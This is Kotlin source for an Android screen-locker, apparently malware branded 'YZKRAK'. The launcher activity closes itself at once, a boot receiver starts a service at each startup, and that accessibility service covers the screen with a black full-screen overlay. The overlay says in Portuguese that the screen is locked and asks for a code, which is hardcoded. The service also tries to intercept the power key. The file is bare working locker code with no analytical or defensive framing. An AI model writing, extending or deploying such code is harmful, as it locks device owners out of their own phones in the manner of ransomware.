package com.yzrak.gen

import android.app.*
import android.content.*
import android.graphics.*
import android.os.*
import android.view.*
import android.view.accessibility.*
import android.widget.*

class MainActivity : Activity() {
    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        finish()
    }
}

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(c: Context, i: Intent) =
        c.startService(Intent(c, BlockService::class.java))
}

class BlockService : AccessibilityService() {

    companion object {
        const val OK = "cyyyyyy888787585785"
    }

    override fun onStartCommand(i: Intent?, f: Int, id: Int): Int {
        showOverlay()
        return START_STICKY
    }

    override fun onAccessibilityEvent(e: AccessibilityEvent) {}
    override fun onInterrupt() {}

    private fun showOverlay() {
        val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val ps = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                WindowManager.LayoutParams.TYPE_SYSTEM_ERROR,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
            PixelFormat.TRANSLUCENT
        )

        val root = FrameLayout(this).apply { setBackgroundColor(Color.BLACK) }
        val tv = TextView(this).apply {
            text = "⚠️ AVISO YZKRAK  ⚠️\nTELA BLOQUEADA!\nDigite o código:"
            setTextColor(Color.WHITE); gravity = Gravity.CENTER; textSize = 20f
        }
        val ed = EditText(this).apply {
            hint = "código"; setTextColor(Color.WHITE); setHintTextColor(Color.GRAY)
        }
        val bt = Button(this).apply {
            text = "OK"
            setOnClickListener {
                if (ed.text.toString() == OK) {
                    root.removeAllViews()
                    root.addView(TextView(this@BlockService).apply {
                        text = "✅ LIBERADO"; setTextColor(Color.GREEN); textSize = 24f; gravity = Gravity.CENTER
                    })
                    Handler(Looper.getMainLooper()).postDelayed({
                        stopSelf(); wm.removeView(root)
                    }, 1500)
                } else {
                    ed.setText("")
                    Toast.makeText(this@BlockService, "Código errado!", Toast.LENGTH_SHORT).show()
                }
            }
        }

        root.addView(tv)
        root.addView(ed)
        root.addView(bt)
        wm.addView(root, ps)
    }

    override fun onKeyEvent(event: KeyEvent): Boolean =
        if (event.keyCode == KeyEvent.KEYCODE_POWER) true
        else super.onKeyEvent(event)
}
